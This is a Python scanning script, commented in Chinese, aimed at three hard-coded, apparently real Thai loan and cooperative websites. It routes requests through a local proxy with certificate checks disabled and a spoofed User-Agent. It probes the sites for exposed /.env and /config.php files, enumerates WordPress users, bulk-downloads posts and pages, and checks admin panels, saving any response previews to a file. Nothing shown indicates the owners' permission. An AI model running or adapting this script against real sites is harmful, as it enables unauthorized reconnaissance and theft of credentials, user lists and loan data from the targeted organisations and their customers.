"""
Quick Loan Data Scanner
Targeted scanning for key loan data endpoints
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Any, Optional

class QuickLoanDataScanner:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.timeout = 3  # 减少超时时间
    
    def quick_scan(self, target_url: str) -> Dict[str, Any]:
        """快速扫描贷款数据"""
        
        quick_data = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'key_endpoints': [],
            'loan_pages': [],
            'api_access': [],
            'admin_access': []
        }
        
        try:
            # 关键贷款相关端点
            key_endpoints = [
                '/wp-json/wp/v2/posts?search=loan',
                '/wp-json/wp/v2/posts?search=credit', 
                '/wp-json/wp/v2/posts?search=สินเชื่อ',
                '/wp-json/wp/v2/posts?search=เงินกู้',
                '/wp-json/wp/v2/posts?categories=12',  # 公告类别
                '/api/loan',
                '/loan',
                '/credit',
                '/finance',
                '/wp-admin/admin-ajax.php',
                '/.env',
                '/config.php'
            ]
            
            for endpoint in key_endpoints:
                try:
                    url = f"{target_url}{endpoint}"
                    response = self.session.get(
                        url, 
                        proxies=self.proxies, 
                        timeout=self.timeout, 
                        verify=False,
                        headers=self.headers
                    )
                    
                    if response.status_code == 200:
                        try:
                            data = response.json() if 'json' in response.headers.get('content-type', '') else response.text[:500]
                        except:
                            data = response.text[:500]
                            
                        quick_data['key_endpoints'].append({
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'accessible': True,
                            'data_preview': data
                        })
                    else:
                        quick_data['key_endpoints'].append({
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'accessible': False
                        })
                        
                except Exception as e:
                    quick_data['key_endpoints'].append({
                        'endpoint': endpoint,
                        'status_code': 'error',
                        'accessible': False,
                        'error': str(e)
                    })
            
            # 快速扫描贷款页面
            self._quick_loan_pages(target_url, quick_data)
            
            # 快速API访问测试
            self._quick_api_test(target_url, quick_data)
            
            # 管理页面访问测试
            self._quick_admin_test(target_url, quick_data)
            
        except Exception as e:
            quick_data['error'] = str(e)
            
        return quick_data
    
    def _quick_loan_pages(self, target_url: str, quick_data: Dict[str, Any]):
        """快速扫描贷款页面"""
        loan_pages = [
            '/loan-officer/', '/register-68/', '/withdraw-atm/',
            '/deposit-retire/', '/div/', '/personnel/'
        ]
        
        for page in loan_pages:
            try:
                url = f"{target_url}{page}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=self.timeout, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    quick_data['loan_pages'].append({
                        'page': page,
                        'status_code': response.status_code,
                        'accessible': True,
                        'title': self._extract_title(response.text)
                    })
                else:
                    quick_data['loan_pages'].append({
                        'page': page,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                quick_data['loan_pages'].append({
                    'page': page,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _quick_api_test(self, target_url: str, quick_data: Dict[str, Any]):
        """快速API测试"""
        api_endpoints = [
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/posts?per_page=100',
            '/wp-json/wp/v2/pages?per_page=50'
        ]
        
        for endpoint in api_endpoints:
            try:
                url = f"{target_url}{endpoint}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=self.timeout, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        quick_data['api_access'].append({
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'accessible': True,
                            'data_count': len(data) if isinstance(data, list) else 1
                        })
                    except:
                        quick_data['api_access'].append({
                            'endpoint': endpoint,
                            'status_code': response.status_code,
                            'accessible': True,
                            'content_type': 'text/html'
                        })
                else:
                    quick_data['api_access'].append({
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                quick_data['api_access'].append({
                    'endpoint': endpoint,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _quick_admin_test(self, target_url: str, quick_data: Dict[str, Any]):
        """快速管理页面测试"""
        admin_pages = [
            '/wp-admin/', '/admin/', '/dashboard/', '/control/'
        ]
        
        for page in admin_pages:
            try:
                url = f"{target_url}{page}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=self.timeout, 
                    verify=False,
                    headers=self.headers
                )
                
                quick_data['admin_access'].append({
                    'page': page,
                    'status_code': response.status_code,
                    'accessible': response.status_code == 200,
                    'content_length': len(response.text)
                })
                    
            except Exception as e:
                quick_data['admin_access'].append({
                    'page': page,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _extract_title(self, html: str) -> str:
        """从HTML中提取标题"""
        import re
        title_match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()
        return ""

def main():
    scanner = QuickLoanDataScanner()
    
    targets = [
        "https://peacoop.or.th",
        "https://mula-x.com", 
        "https://ngoenmun.com"
    ]
    
    all_quick_data = {}
    
    for target in targets:
        print(f"正在快速扫描 {target}...")
        try:
            data = scanner.quick_scan(target)
            all_quick_data[target] = data
            print(f"成功扫描 {target}")
        except Exception as e:
            print(f"扫描 {target} 时出错: {e}")
            all_quick_data[target] = {'error': str(e)}
    
    # 保存数据
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"QUICK_LOAN_DATA_{timestamp}.json"
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(all_quick_data, f, ensure_ascii=False, indent=2)
    
    print(f"快速扫描数据已保存到: {filename}")
    
    # 生成汇总报告
    total_key_endpoints = 0
    total_loan_pages = 0
    total_apis = 0
    total_admin = 0
    
    for target, data in all_quick_data.items():
        if 'key_endpoints' in data:
            total_key_endpoints += len([e for e in data['key_endpoints'] if e.get('accessible')])
        if 'loan_pages' in data:
            total_loan_pages += len([p for p in data['loan_pages'] if p.get('accessible')])
        if 'api_access' in data:
            total_apis += len([a for a in data['api_access'] if a.get('accessible')])
        if 'admin_access' in data:
            total_admin += len([a for a in data['admin_access'] if a.get('accessible')])
    
    print(f"\n=== 快速扫描汇总 ===")
    print(f"目标站点数量: {len(targets)}")
    print(f"可访问关键端点: {total_key_endpoints}")
    print(f"可访问贷款页面: {total_loan_pages}")
    print(f"可访问API端点: {total_apis}")
    print(f"可访问管理页面: {total_admin}")

if __name__ == "__main__":
    main()